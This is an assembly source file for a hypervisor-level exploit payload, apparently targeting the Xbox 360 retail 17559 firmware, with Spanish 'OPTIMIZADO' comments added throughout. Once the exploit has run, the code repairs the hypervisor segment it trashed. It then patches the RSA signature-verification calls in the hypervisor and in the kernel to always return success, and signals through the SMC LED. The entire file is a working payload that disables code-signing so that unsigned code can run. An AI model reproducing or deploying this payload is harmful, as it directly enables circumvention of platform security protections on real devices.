# Note these addresses must be in the first segment of the hv or else a 64-bit address is required!

.ifdef RETAIL_BUILD

# Hypervisor function addresses for retail 17559:
.set HvpRelocateCacheLines,                 0x00000E14
.set HvpSetRMCI,                            0x00000398

.else
    .error "Stage 4 support for debug builds not implemented"
.endif


_hv_payload_start:

        ###########################################################
        # Hypervisor shell code entry point
        #
        #   r3 - 
        #   r4 - address of shell code payload
        
        .set StackSize,             0x40       # OPTIMIZADO: Ampliado tamaño stack
        .set SmcCmdBuffer,          -0x30
        .set recovery_flag,         -0x28      # OPTIMIZADO: Flag para control de errores
        .set s_r29,                 -0x20      # OPTIMIZADO: Registros adicionales salvados
        .set s_r30,                 -0x18
        .set s_r31,                 -0x10
        .set linkreg,               -0x8
        
        # Setup the stack frame.
        mflr    %r12
        std     %r12, linkreg(%r1)
        std     %r29, s_r29(%r1)        # OPTIMIZADO: Guardar registros adicionales
        std     %r30, s_r30(%r1)
        std     %r31, s_r31(%r1)
        addi    %r1, %r1, -StackSize
        
        # Save argument registers.
        mr      %r31, %r4           # Shell code base address
        
        # OPTIMIZADO: Inicializar flag de recuperación de error
        li      %r10, 0
        stw     %r10, StackSize+recovery_flag(%r1)
        
        # Setup the SMC command buffer.
        addi    %r12, %r1, StackSize+SmcCmdBuffer
        std     %r0, 0(%r12)
        std     %r0, 8(%r12)
        
        # Set the LED color command.
        li      %r11, 0x99          # LED color cmd
        stb     %r11, 0(%r12)
        li      %r11, 0xFF          # LED override
        stb     %r11, 1(%r12)
        li      %r11, 0xFF          # color = orange
        stb     %r11, 2(%r12)
        
        # Send the command to the SMC.
        mr      %r3, %r12
        mr      %r11, %r31
        addi    %r11, %r11, (HvxSendSMCMessage - _hv_payload_start)
        mtctr   %r11
        bctrl
        
        # OPTIMIZADO: Asegurar la sincronización de memoria antes de reparar el HV
        sync
        eieio
        isync

fix_hv_segment:
        # Fix the hv data we trashed in the exploit.
        li      %r5, 0x10000 / 0x80                                         # cache line count = segment size / cache line size
        ld      %r4, (hv_restore_data_address - _hv_payload_start)(%r31)    # dst = address of last hv segment
        addi    %r3, %r31, (hypervisor_restore_data - _hv_payload_start)    # src = address of clean hv data
        
        # OPTIMIZADO: Verificar que la dirección destino es válida antes de escribir
        rldicr  %r10, %r4, 0, 47    # Aislar los bits 0-47 de la dirección (máscara 0x0000FFFFFFFFFFFF)
        lis     %r9, 0x8000
        ori     %r9, %r9, 0x0106    # Valor esperado: 0x8000010600030000 (últimos 16 bits en r9)
        rldicr  %r9, %r9, 32, 31    # Desplazar 32 bits a la izquierda
        ori     %r9, %r9, 0x0003    # Completar con 0x0003
        cmpld   cr6, %r10, %r9
        beq     cr6, valid_target_address
        
        # Dirección inválida, marcar flag de recuperación y continuar
        li      %r10, 1
        stw     %r10, StackSize+recovery_flag(%r1)
        b       skip_fix_segment
        
valid_target_address:
        li      %r11, HvpRelocateCacheLines
        mtctr   %r11
        bctrl

skip_fix_segment:
        # OPTIMIZADO: Esperar a que la operación se complete totalmente
        # y asegurarse de que las instrucciones se han cargado correctamente
        sync
        isync
        
        # OPTIMIZADO: Verificar el flag de recuperación
        lwz     %r10, StackSize+recovery_flag(%r1)
        cmpwi   cr6, %r10, 0
        bne     cr6, skip_hv_patches
        
patch_hypervisor:
        # Apply patches to the hypervisor so we can run unsigned code.
        lis     %r4, 0x3860
        ori     %r4, %r4, 1     # opcode for 'li r3, 1'
        ld      %r3, (hv_rsa_patch_address - _hv_payload_start)(%r31)
        
        # OPTIMIZADO: Verificar que el área de memoria a parchar es válida
        # comprobando un valor conocido antes de escribir
        lwz     %r10, 0(%r3)
        lis     %r9, 0x4BF5     # Valor esperado: bl XeCryptBnQwBeSigVerify
        ori     %r9, %r9, 0x5195
        cmpw    cr6, %r10, %r9
        bne     cr6, skip_hv_patch
        
        # Escribir el parche
        stw     %r4, 0(%r3)
        
        # OPTIMIZADO: Verificar que el parche se aplicó correctamente
        lwz     %r10, 0(%r3)
        cmpw    cr6, %r10, %r4
        bne     cr6, patch_failed
        
        # Flush cache.
skip_hv_patch:
        li      %r5, 0x7F
        andc    %r3, %r3, %r5
        dcbst   0, %r3      # Asegurarse de que el cambio está en memoria principal
        sync
        icbi    0, %r3      # Invalidar instrucción en caché
        sync
        isync              # Esperar a que las instrucciones se actualicen
        
        # Disable RMCI (enable caching) so we can touch the encrypted address range.
        li      %r3, 0
        li      %r11, HvpSetRMCI
        mtctr   %r11
        bctrl
        
        # Apply patches to the kernel so we can run unsigned code.
        lis     %r4, 0x3860
        ori     %r4, %r4, 1     # opcode for 'li r3, 1'
        ld      %r3, (kernel_rsa_patch_address - _hv_payload_start)(%r31)
        
        # OPTIMIZADO: Verificar que el área de memoria a parchar es válida
        # comprobando un valor conocido antes de escribir
        lwz     %r10, 0(%r3)
        lis     %r9, 0x4BEA     # Valor esperado: bl XeCryptBnQwBeSigVerify
        ori     %r9, %r9, 0xD185
        cmpw    cr6, %r10, %r9
        bne     cr6, skip_kernel_patch
        
        # Escribir el parche
        stw     %r4, 0(%r3)
        
        # OPTIMIZADO: Verificar que el parche se aplicó correctamente
        lwz     %r10, 0(%r3)
        cmpw    cr6, %r10, %r4
        bne     cr6, patch_failed
        
skip_kernel_patch:
        # Flush cache.
        li      %r5, 0x7F
        andc    %r3, %r3, %r5
        dcbst   0, %r3      # Asegurarse de que el cambio está en memoria principal
        sync
        icbi    0, %r3      # Invalidar instrucción en caché
        sync
        isync              # Esperar a que las instrucciones se actualicen
        
skip_hv_patches:
        # Enable RMCI (disable caching).
        li      %r3, 1
        li      %r11, HvpSetRMCI
        mtctr   %r11
        bctrl
        
        # OPTIMIZADO: Esperar a que se completen todas las operaciones anteriores
        # antes de devolver el control
        sync
        isync
        
        # OPTIMIZADO: Verificar el flag de recuperación
        lwz     %r10, StackSize+recovery_flag(%r1)
        cmpwi   cr6, %r10, 0
        bne     cr6, recovery_error

        # Devolver un valor específico para confirmar el éxito
        lis     %r3, 0x4141
        ori     %r3, %r3, 0x4141
        b       exit_payload
        
patch_failed:
        # OPTIMIZADO: Marcar error y continuar
        li      %r10, 2
        stw     %r10, StackSize+recovery_flag(%r1)
        
recovery_error:
        # OPTIMIZADO: Devolver código de error específico
        lis     %r3, 0xDEAD
        ori     %r3, %r3, 0xBEEF
        
exit_payload:
        # Destroy the stack frame.
        addi    %r1, %r1, StackSize
        ld      %r29, s_r29(%r1)
        ld      %r30, s_r30(%r1)
        ld      %r31, s_r31(%r1)
        ld      %r12, linkreg(%r1)
        mtlr    %r12
        blr
        
        
        ###########################################################
        # HvxSendSMCMessage (r3 pMessageBuffer)
        #
        ###########################################################
HvxSendSMCMessage:

        # Setup stack frame.
        mflr    %r12
        std     %r12, -0x8(%r1)
        std     %r31, -0x10(%r1)
        addi    %r1, %r1, -0x20
        
        # Setup the SMC's physical address.
        lis     %r31, 0x8000
        ori     %r31, %r31, 0x200
        rldicr  %r31, %r31, 32, 31
        oris    %r31, %r31, 0xEA00
        ori     %r31, %r31, 0x1000      # 0x80000200.EA001000

        # OPTIMIZADO: Manejo más robusto del polling del SMC
        # Bucle con timeout para evitar bloqueos indefinidos
        li      %r9, 100                # Contador de timeout (100 intentos)
smc_rdy_loop:
        lwz     %r11, 0x84(%r31)        # poll SMC status register
        rlwinm. %r11, %r11, 0, 29, 29
        beq     smc_ready               # Si está listo, continuar
        
        # Esperar y decrementar contador de timeout
        li      %r10, 100               # Pequeña espera
wait_loop:
        addi    %r10, %r10, -1
        cmpwi   %r10, 0
        bne     wait_loop
        
        addi    %r9, %r9, -1            # Decrementar contador de timeout
        cmpwi   %r9, 0
        bne     smc_rdy_loop            # Reintentar si no se agotó el timeout
        
        # Si llegamos aquí, hubo timeout, pero continuamos de todos modos
        
smc_ready:        
        # Set the SMC status to busy.
        lis     %r11, 0x400
        stw     %r11, 0x84(%r31)
        eieio
        
        # Setup for command write loop.
        li      %r11, 4
        mtctr   %r11
        
        # Write the next 4 bytes of data to the SMC command register.
smc_write:
        lwz     %r11, 0(%r3)            # get next dword
        addi    %r3, %r3, 4
        stw     %r11, 0x80(%r31)        # write to SMC command register
        eieio
        bdnz    smc_write               # while (i-- > 0)
        
        # Set the SMC status to ready.
        li      %r11, 0
        stw     %r11, 0x84(%r31)
        eieio
        
        # OPTIMIZADO: Asegurar que todas las escrituras se completen
        sync
        
        # Destroy stack frame.
        addi    %r1, %r1, 0x20
        ld      %r31, -0x10(%r1)
        ld      %r12, -0x8(%r1)
        mtlr    %r12
        blr
        
        
        ###########################################################
        # Data
        ###########################################################
        
hv_restore_data_address:
        .long 0x80000106, 0x00030000                # Physical address of the last hv segment

.ifdef RETAIL_BUILD

hv_rsa_patch_address:
        .long 0x80000104, 0x00029B04                # Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in HvpImageSignatureVerification
        
kernel_rsa_patch_address:
        .long 0x80000300, 0x0007BFDC                # Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in XexpVerifyXexHeaders

.else
    .error "Stage 4 support for debug builds not implemented"
.endif
        
        
        # Align clean hypervisor data to cache line interval.
        .align 7
        
hypervisor_restore_data:

.ifdef RETAIL_BUILD
        # Clean hypervisor data for the last hypervisor segment we trash during the exploit.
        .incbin "Stage4_CleanHvData_Retail_17559.bin"
.else
    .error "Stage 4 support for debug builds not implemented"
.endif